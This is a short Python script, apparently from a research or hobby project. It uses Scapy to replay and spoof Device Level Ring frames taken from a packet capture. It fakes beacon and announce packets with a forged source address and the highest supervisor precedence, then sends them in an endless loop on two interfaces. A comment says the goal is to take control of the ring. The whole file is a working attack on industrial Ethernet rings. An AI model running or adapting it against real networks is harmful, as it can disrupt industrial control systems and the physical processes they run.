__author__ = 'bernardyuan'

from scapy import all
from scapy.layers import  l2
import DLR
# read the pcap file
a = all.rdpcap('DLR/dlr.pcap')
import time
#in order: Beacon, nbr request, link status, locate fault,Announce, Sign on
# fake a packet and send through wireshark

#fabricate packet method 1:
#construct from keywords
# b = l2.Ether(**a[i][l2.Ether].fields)/l2.Dot1Q(**a[i][l2.Dot1Q].fields)/protocol.DLR(**a[i][protocol.DLR].fields)
# remember when constructed from keywords, do change the explicit value of ALL layers into 1
# otherwise use method 2, given below:
# b.explicit = 1
# b.payload.explicit = 1

# method 2:
# construct from raw string
# b0 = l2.Ether(str(a[0]))

# In the following code, we construct a new packet with method2, which could make your machine imitate
# a ring supervisor, and take control of the ring
# newpacket = l2.Ether(**a[30467][l2.Ether].fields)/l2.Dot1Q(**a[30467][l2.Dot1Q].fields)/DLR.DLR(**a[30467][DLR.DLR].fields)
beaconpacket = l2.Ether(**a[0][l2.Ether].fields)/l2.Dot1Q(**a[0][l2.Dot1Q].fields)/DLR.DLR(**a[0][DLR.DLR].fields)
announcepacket = l2.Ether(**a[1937][l2.Ether].fields)/l2.Dot1Q(**a[1937][l2.Dot1Q].fields)/DLR.DLR(**a[1937][DLR.DLR].fields)
# newpacket.payload.payload.fields["Node_Num"] = 1
# print newpacket.payload.payload.fields["SignOnInfo"]
# newpacket.payload.payload.fields["SignOnInfo"]["MACAddress"] = ["00:1d:9c:c8:03:e8"]
# newpacket.payload.payload.fields["SignOnInfo"]["IPAddress"] = ["192.168.0.19"]
beaconpacket.explicit = 1
beaconpacket.payload.explicit = 1

announcepacket.explicit=1
announcepacket.payload.explicit=1

beaconpacket.fields["src"] = "00:1d:9c:c8:03:e8"
announcepacket.fields["src"] = "00:1d:9c:c8:03:e8"
# newpacket.payload.payload.fields["Source_Port"] = 1
beaconpacket.payload.payload.fields["Supervisor_Precedence"] = 255
beaconpacket.payload.payload.fields["Reserved"]='\x00\x01\x02\x03\x04\x05\x06\x07\x00\x01\x02\x03\x04\x05\x06\x07\x00\x01\x02\x03'
beaconpacket.payload.payload.fields["Sequence_ID"] = 0
beaconpacket.payload.payload.fields["Source_IP"] = '192.168.0.19'
beaconpacket.payload.payload.fields["Beacon_Timeout"] = 1960
beaconpacket.payload.payload.fields["Beacon_Interval"] = 400

announcepacket.payload.payload.fields["Sequence_ID"] = 0
announcepacket.payload.payload.fields["Source_IP"] = '192.168.0.19'
# interval = newpacket.payload.payload.fields["Beacon_Interval"]
beaconstart = time.clock()
announcestart = time.clock()

announcepacket.payload.payload.fields["Ring_State"] = 2
beaconpacket.payload.payload.fields["Ring_State"] = 2
for i in range(10) :
    all.sendp(str(announcepacket),iface='en5')
    # all.sendp(str(announcepacket),iface='en4')
    all.sendp(str(beaconpacket),iface='en5')
    all.sendp(str(beaconpacket),iface='en4')

announcepacket.payload.payload.fields["Ring_State"] = 1
beaconpacket.payload.payload.fields["Ring_State"] = 1
while True:
    if time.clock() - beaconstart > 400*1.0/1000000:
        beaconstart = time.clock()
    # print str(newpacket)
        beaconpacket.payload.payload.fields["Sequence_ID"] = beaconpacket.payload.payload.fields["Sequence_ID"]+1
        beaconpacket.show()
        beaconpacket.payload.payload.fields["Reserved"]="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        all.sendp(str(beaconpacket),iface='en5')
        beaconpacket.payload.payload.fields["Reserved"]="\x01\x02\x03\x04\x05\x01\x02\x03\x04\x05\x01\x02\x03\x04\x05\x01\x02\x03\x04\x05"
        all.sendp(str(beaconpacket),iface='en4')
    if time.clock() - announcestart > 1:
        announcestart = time.clock()
        announcepacket.payload.payload.fields["Sequence_ID"] += 1
        all.sendp(str(announcepacket),iface='en5')
        # all.sendp(str(announcepacket),iface='en4')

